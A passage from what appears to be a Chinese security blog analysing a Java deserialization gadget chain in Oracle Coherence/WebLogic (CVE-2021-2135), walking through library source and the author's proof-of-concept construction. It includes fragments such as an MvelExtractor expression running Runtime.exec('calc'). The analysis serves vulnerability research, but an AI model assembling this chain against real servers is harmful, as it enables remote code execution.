class="params">(DataInput in, <span class="keyword">int</span> nType, ClassLoader loader)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(nType) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> readInt(in);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> readLong(in);</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        Binary bin = <span class="keyword">new</span> Binary(); <span class="comment">//调用Binary.readExternal反序列化读取</span></span><br><span class="line">        bin.readExternal(in);</span><br><span class="line">        <span class="keyword">return</span> bin;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> readExternalizableLite(in, loader); <span class="comment">// 当nType=10，调用readExternalizableLite</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        <span class="keyword">return</span> readSerializable(in, loader);</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">case</span> <span class="number">255</span>:</span><br><span class="line">        <span class="keyword">return</span> readSerializable(in, loader);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(<span class="string">"invalid type: "</span> + nType);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>ExternalizableHelper.readExternalizableLite</code>中，会实例化类为value，并且会调用value所属类的readExternal方法来读取最终的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ExternalizableLite <span class="title">readExternalizableLite</span><span class="params">(DataInput in, ClassLoader loader)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ExternalizableLite value;</span><br><span class="line">    <span class="keyword">if</span> (in <span class="keyword">instanceof</span> PofInputStream) &#123;</span><br><span class="line">        value = (ExternalizableLite)((PofInputStream)in).readObject();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String sClass = readUTF((DataInput)in); <span class="comment">// 获取类名</span></span><br><span class="line">        WrapperDataInputStream inWrapper = in <span class="keyword">instanceof</span> WrapperDataInputStream ? (WrapperDataInputStream)in : <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 加载并实例化序列化时写入的类名</span></span><br><span class="line">            value = (ExternalizableLite)loadClass(sClass, loader, inWrapper == <span class="keyword">null</span> ? <span class="keyword">null</span> : inWrapper.getClassLoader()).newInstance();</span><br><span class="line">......</span><br><span class="line"><span class="comment">// 调用value的readExternal方法读取对象</span></span><br><span class="line">        value.readExternal((DataInput)in);</span><br><span class="line">        <span class="comment">// !!注意这里 当value是SerializerAware的实例，会设置它的Serializer</span></span><br><span class="line">        <span class="keyword">if</span> (value <span class="keyword">instanceof</span> SerializerAware) &#123;</span><br><span class="line">            ((SerializerAware)value).setContextSerializer(ensureSerializer(loader));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里我们已经明白了<code>SimpleBinaryEntry</code>本质是Entry，有键值对，它的key即<code>m_key</code>属性、value即<code>m_value</code>属性，可以通过<code>getKey</code>和<code>getValue</code>设置，而<code>getKey</code>通过<code>ExternalizableHelper.fromBinary</code>来处理，<code>ExternalizableHelper.fromBinary</code>会根据<code>m_binKey</code>的数据类型的不同调用不同的反序列化方法进行读取，那么我们可以构造<code>m_binKey</code>达到我们命令执行的目的。</p><p>那么到这里我们怎么执行命令？参考之前的漏洞<a href="https://xz.aliyun.com/t/9550" target="_blank" rel="noopener">CVE-2020-14756</a>，可以考虑通过<code>com.tangosol.coherence.rest.util.extractor.MvelExtractor#extrace</code>执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ExternalizableHelper.readExternalizableLite()</span><br><span class="line">        TopNAggregator.PartialResult.readExternal()</span><br><span class="line">           TopNAggregator.PartialResult.add()</span><br><span class="line">             (AbstractExtractor)MvelExtractor.compare()</span><br><span class="line">               MvelExtractor.extract()</span><br><span class="line">                 MVEL.executeExpression()</span><br></pre></td></tr></table></figure><h4 id="3、TopNAggregator-PartialResult-readExternal-到命令执行"><a href="#3、TopNAggregator-PartialResult-readExternal-到命令执行" class="headerlink" title="3、TopNAggregator.PartialResult.readExternal()到命令执行"></a>3、TopNAggregator.PartialResult.readExternal()到命令执行</h4><p><code>TopNAggregator$PartialResult</code>实现了<code>ExternalizableLite</code>，其重写了<code>readExternal()</code>，我们可以通过<code>ExternalizableHelper.readExternalizableLite()</code>调用<code>TopNAggregator$PartialResult.readExternal</code>。</p><p><code>TopNAggregator$PartialResult.readExternal</code>主要读取和恢复<code>m_comparator</code>、<code>m_cMaxSize</code>、<code>m_map</code>属性的数据，其中调用了<code>Comparator.readObject</code>给属性<code>m_comparator</code>赋值，<code>comparator</code> 可控为 <code>MvelExtractor</code>，<code>m_map</code>是用<code>m_comparator</code>构造的<code>TreeMap</code>实例，并且通过<code>TopNAggregator$PartialResult.add</code>添加map的键值对。<code>TopNAggregator$PartialResult.add</code>会调用父类的add方法，最终通过map.put添加数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(DataInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 这里会调用Comparator.readObject给this.m_comparator赋值</span></span><br><span class="line">    <span class="keyword">this</span>.m_comparator = (Comparator)ExternalizableHelper.readObject(in);</span><br><span class="line">    <span class="keyword">this</span>.m_cMaxSize = ExternalizableHelper.readInt(in);</span><br><span class="line">    <span class="comment">//调用SortedBag.instantiateInternalMap</span></span><br><span class="line">    <span class="keyword">this</span>.m_map = <span class="keyword">this</span>.instantiateInternalMap(<span class="keyword">this</span>.m_comparator);</span><br><span class="line">    <span class="keyword">int</span> cElems = in.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cElems; ++i) &#123;</span><br><span class="line">        <span class="comment">// 调用add</span></span><br><span class="line">        <span class="keyword">this</span>.add(ExternalizableHelper.readObject(in));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.m_comparator_copy = <span class="keyword">this</span>.m_comparator;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E o)</span> </span>&#123;</span><br><span class="line">    NavigableMap map = <span class="keyword">this</span>.getInternalMap();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!Base.equals(o, <span class="keyword">this</span>.unwrap(map.ceilingKey(o)))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map.put(o, NO_VALUE) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 调用map.put</span></span><br><span class="line">    map.put(<span class="keyword">this</span>.wrap(o), NO_VALUE);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TreeMap.put()调用TreeMap.compare，最终会调用<code>comparator.compare((K)k1, (K)k2)</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    Entry&lt;K,V&gt; t = root;</span><br><span class="line">    <span class="keyword">if</span> (t == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用TreeMap.compare</span></span><br><span class="line">        compare(key, key); <span class="comment">// type (and possibly null) check</span></span><br><span class="line">......</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cmp;</span><br><span class="line">    Entry&lt;K,V&gt; parent;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object k1, Object k2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> comparator==<span class="keyword">null</span> ? ((Comparable&lt;? <span class="keyword">super</span> K&gt;)k1).compareTo((K)k2) : comparator.compare((K)k1, (K)k2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果这里comparator是我们构造的MvelExtractor实例，MvelExtractor继承了AbstractExtractor，便可以调用<code>AbstractExtractor.compare</code>，从而调用<code>MvelExtractor.extract</code>达到命令执行的目的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># AbstractExtractor.compare</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object o1, Object o2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> SafeComparator.compareSafe((Comparator)<span class="keyword">null</span>, <span class="keyword">this</span>.extract(o1), <span class="keyword">this</span>.extract(o2));</span><br><span class="line">&#125;</span><br><span class="line"># MvelExtractor.extract</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">extract</span><span class="params">(Object oTarget)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用MVEL.executeExpression执行命令</span></span><br><span class="line"><span class="keyword">return</span> oTarget == <span class="keyword">null</span> ? <span class="keyword">null</span> : MVEL.executeExpression(<span class="keyword">this</span>.getCompiledExpression(), oTarget);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三、反序列化载体分析："><a href="#三、反序列化载体分析：" class="headerlink" title="三、反序列化载体分析："></a>三、反序列化载体分析：</h3><h4 id="1、SimpleBinaryEntry-toString-的触发"><a href="#1、SimpleBinaryEntry-toString-的触发" class="headerlink" title="1、SimpleBinaryEntry.toString()的触发"></a>1、<code>SimpleBinaryEntry.toString()</code>的触发</h4><p>反序列化到<code>SimpleBinaryEntry.toString()</code>的触发，在<a href="https://mp.weixin.qq.com/s/eyZfAPivCkMbNCfukngpzg" target="_blank" rel="noopener">360CERT</a>中提到用<code>com.sun.org.apache.xpath.internal.objects.XString.equals()</code>。当<code>XString.equals()</code>的参数是SimpleBinaryEntry实例时，可以调用<code>SimpleBinaryEntry.toString</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">null</span> == obj2)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (obj2 <span class="keyword">instanceof</span> XNodeSet)</span><br><span class="line">    <span class="keyword">return</span> obj2.equals(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(obj2 <span class="keyword">instanceof</span> XNumber)</span><br><span class="line">      <span class="keyword">return</span> obj2.equals(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> str().equals(obj2.toString());<span class="comment">//，当传入的是simpleBinaryEntry，调用SimpleBinaryEntry.toString</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时候需要触发<code>XString.equals(simpleBinaryEntry)</code>，我们可以考虑Map的put方法，因为Map一般在插入元素时做比较会调用equal，并且Map有个特别之处就是它一般不限制对象的类型，我们可以构造Map的Key或者Value为不同的对象如XString实例或者simpleBinaryEntry实例。</p><p><code>com.tangosol.util.LiteMap</code>继承了<code>com.tangosol.util.InflatableMap</code>，<code>InflatableMap.put</code>中当<code>InflatableMap.m_nImpl==1</code>，通过调用<code>Objects.equals(xString, simpleBinaryEntry)</code>可以调用<code>xString.equals(simpleBinaryEntry)</code>。所以LiteMap构造时传入的Map是<code>map&lt;simpleBinaryEntry, anyValue&gt;</code>和<code>map&lt;xString, anyValue&gt;</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="keyword">this</span>.m_nImpl) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">this</span>.m_nImpl = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">this</span>.m_oContents = <span class="keyword">this</span>.instantiateEntry(key, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Entry&lt;K, V&gt; entry = (Entry)<span class="keyword">this</span>.m_oContents;</span><br><span class="line">        K entryKey = entry.getKey();</span><br><span class="line">        V prevValue = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// this.m_nImpl==1，调用Objects.equals(key, entryKey)，Objects.equals(xString, simpleBinaryEntry)</span></span><br><span class="line">        <span class="keyword">if</span> (Objects.equals(key, entryKey)) &#123;</span><br><span class="line">            prevValue = entry.getValue();</span><br><span class="line">            entry.setValue(value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Entry&lt;K, V&gt;[] aEntry = <span class="keyword">new</span> Entry[<span class="number">8</span>];</span><br><span class="line">            aEntry[<span class="number">0</span>] = entry;</span><br><span class="line">            aEntry[<span class="number">1</span>] = <span class="keyword">this</span>.instantiateEntry(key, value);</span><br><span class="line">            <span class="keyword">this</span>.m_nImpl = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">this</span>.m_oContents = aEntry;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> prevValue;</span><br><span class="line">...</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object a, Object b)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 当a!=b，返回a.equals(b)，当a是xString，b是simpleBinaryEntry，a肯定不等于b，调用xString.equals(simpleBinaryEntry)</span></span><br><span class="line">    <span class="keyword">return</span> (a == b) || (a != <span class="keyword">null</span> &amp;&amp; a.equals(b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、反序列化入口"><a href="#2、反序列化入口" class="headerlink" title="2、反序列化入口"></a>2、反序列化入口</h4><p>那么接下来是找到反序列化入口，必然涉及到readObject或readExternal等类似读取的方法，如何在这些方法中调用<code>LiteMap.put</code>。<code>com.tangosol.util.processor.ConditionalPutAll</code>实现了<code>com.tangosol.io.ExternalizableLite</code>并重写了readExternal，在readExternal中构造了LiteMap实例，并且调用了<code>com.tangosol.util.ExternalizableHelper.readMap</code>将map的属性读取赋值给LiteMap实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(DataInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.m_filter = (Filter)ExternalizableHelper.readObject(in);</span><br><span class="line">    <span class="comment">// 创建LiteMap对象</span></span><br><span class="line">    Map map = <span class="keyword">this</span>.m_map = <span class="keyword">new</span> LiteMap();</span><br><span class="line">    <span class="comment">// 调用ExternalizableHelper.readMap处理map的反序列化</span></span><br><span class="line">    ExternalizableHelper.readMap(in, map, (ClassLoader)<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>com.tangosol.util.ExternalizableHelper.readMap</code>中调用了<code>map.put</code>，假如oKey=xString、oVal=simpleBinaryEntry，刚好就能调用这里的map是LiteMap的实例，所以会调用<code>com.tangosol.util.InflatableMap.put(xString,simpleBinaryEntry)</code>，跟前面的链就连上了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">readMap</span><span class="params">(DataInput in, Map map, ClassLoader loader)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cEntries;</span><br><span class="line">    <span class="keyword">if</span> (in <span class="keyword">instanceof</span> PofInputStream) &#123;</span><br><span class="line">        PofInputStream inPof = (PofInputStream)in;</span><br><span class="line">        inPof.getPofReader().readMap(inPof.nextIndex(), map);</span><br><span class="line">        cEntries = map.size();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cEntries = in.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cEntries; ++i) &#123;</span><br><span class="line">            <span class="comment">// 读取map.key</span></span><br><span class="line">            Object oKey = readObject(in, loader);</span><br><span class="line">            <span class="comment">// 读取map.value</span></span><br><span class="line">            Object oVal = readObject(in, loader);</span><br><span class="line">            <span class="comment">// 调用map.put将key和value添加到map</span></span><br><span class="line">            map.put(oKey, oVal);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cEntries;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚开始的时候分析到这里我以为就完成了整个链，没想到忽略了一点-<strong>ConditionalPutAll只有<code>readExternal(DataInput in)</code>方法</strong>，没有实现Externalizable，不能传入<code>ObjectInput</code>，所以不但能作为入口。我们可以用CVE-2020-14756的<code>com.tangosol.coherence.servlet.AttributeHolder</code>作为入口，AttributeHolder实现了Externalizable，并且可以通过调用<code>readExternal(ObjectInput in)</code>调用<code>ExternalizableHelper.readObject(in)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.readExternal((DataInput)in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(DataInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.m_sName = ExternalizableHelper.readUTF(in);</span><br><span class="line">    <span class="comment">//通过ExternalizableHelper.readObject可以进一步调用ExternalizableHelper.readObjectInternal</span></span><br><span class="line">    <span class="keyword">this</span>.m_oValue = ExternalizableHelper.readObject(in);</span><br><span class="line">    <span class="keyword">this</span>.m_fActivationListener = in.readBoolean();</span><br><span class="line">    <span class="keyword">this</span>.m_fBindingListener = in.readBoolean();</span><br><span class="line">    <span class="keyword">this</span>.m_fLocal = in.readBoolean();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="四、POC构造遇到的三个问题"><a href="#四、POC构造遇到的三个问题" class="headerlink" title="四、POC构造遇到的三个问题"></a>四、POC构造遇到的三个问题</h3><p>在构造POC时，遇到了三个分析了很久才解决的问题：</p><ul><li><p><code>SimpleBinaryEntry.m_binKey</code>的构造问题</p></li><li><p>不设置<code>SimpleBinaryEntry.m_serializer</code>导致序列化失败</p></li><li><p>ClassCastException报错问题导致序列化失败</p></li></ul><h4 id="1、SimpleBinaryEntry-m-binKey的构造问题"><a href="#1、SimpleBinaryEntry-m-binKey的构造问题" class="headerlink" title="1、SimpleBinaryEntry.m_binKey的构造问题"></a>1、<code>SimpleBinaryEntry.m_binKey</code>的构造问题</h4><p>最初构造m_binKey时，我用的是<code>TopNAggregator$PartialResult.writeExternal()</code>来写二进制数据，我忘了很重要的一点，<code>writeExternal()</code>一般序列化只会写一些属性，不涉及<code>TopNAggregator$PartialResult</code>自身的序列化，所以我调试到这里始终进不去<code>TopNAggregator$PartialResult.writeExternal()</code>，后来通过ExternalizableHelper解决了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExternalizableHelper.writeObject(dataOutputStream1, partialResult);</span><br></pre></td></tr></table></figure><h4 id="2、不设置SimpleBinaryEntry-m-serializer导致序列化失败"><a href="#2、不设置SimpleBinaryEntry-m-serializer导致序列化失败" class="headerlink" title="2、不设置SimpleBinaryEntry.m_serializer导致序列化失败"></a>2、不设置<code>SimpleBinaryEntry.m_serializer</code>导致序列化失败</h4><p>SimpleBinaryEntry在反序列化时会通过<code>if (value instanceof SerializerAware) {((SerializerAware)value).setContextSerializer(ensureSerializer(loader));}</code>给m_serializer赋值，所以虽然m_serializer时transient类型但是也被赋值了。但是在序列化时，我们需要用setContextSerializer给m_serializer赋值，如果没有设置m_serializer，会报错NullPointerException，因为SimpleBinaryEntry的key和value需要利用m_serializer来获取。调试的时候发现默认使用的是<code>com.tangosol.io.DefaultSerializer</code>，所以我在设置时也用了它。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Serializer m_serializer= <span class="keyword">new</span> DefaultSerializer(SimpleBinaryEntry<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line">simpleBinaryEntry.setContextSerializer(m_serializer);</span><br></pre></td></tr></table></figure><h4 id="3、ClassCastException报错问题"><a href="#3、ClassCastException报错问题" class="headerlink" title="3、ClassCastException报错问题"></a>3、ClassCastException报错问题</h4><p>在用y4er CVE-2020-14756的POC时也报了错：ClassCastException，但不影响执行命令，但是我的POC在序列化也执行了命令，所以才会报这个错并且导致程序执行不下去。<img src="/imgs/image-20210729204719132.png" alt="image-20210729204719132"></p><p>执行了<code>SafeComparator.compareSafe((Comparator)null, this.extract(o1), this.extract(o2))</code>，真正报错的地方在该方法的<code>((Comparable)o1).compareTo(o2)</code>。因为在传入参数时调用<code>MvelExtractor.extract(o1)</code>传值，extract通过<code>MVEL.executeExpression</code>返回结果，extract会把<code>MVEL.executeExpression</code>的结果返回作为o1，<strong>当<code>MVEL.executeExpression</code>执行结果是空默认会返回一个<code>java.lang.ProcessImpl</code>对象</strong>，<code>ProcessImpl</code>并不是<code>Comparable</code>的子类，所以将<code>ProcessImpl</code>转为<code>Comparable</code>会报一个转换错误。如何解决呢？既然执行的结果是空才会返回<code>ProcessImpl</code>对象，我只要返回一个实现了<code>Comparable</code>的类的实例就可以解决这个问题，这里我用了Integer。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MvelExtractor extractor1 = <span class="keyword">new</span> MvelExtractor(<span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");return new Integer(1);"</span>);</span><br></pre></td></tr></table></figure><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://xz.aliyun.com/t/9550" target="_blank" rel="noopener">https://xz.aliyun.com/t/9550</a><br><a href="https://y4er.com/post/weblogic-cve-2020-14756/" target="_blank" rel="noopener">https://y4er.com/post/weblogic-cve-2020-14756/</a><br><a href="https://mp.weixin.qq.com/s/eyZfAPivCkMbNCfukngpzg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/eyZfAPivCkMbNCfukngpzg</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2021-2135 </tag>
            
            <tag> CVE-2020-14756 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于JDK7u21 Gadgets的两个问题的探讨</title>
      <link href="2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/"/>
      <url>2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/</url>
      
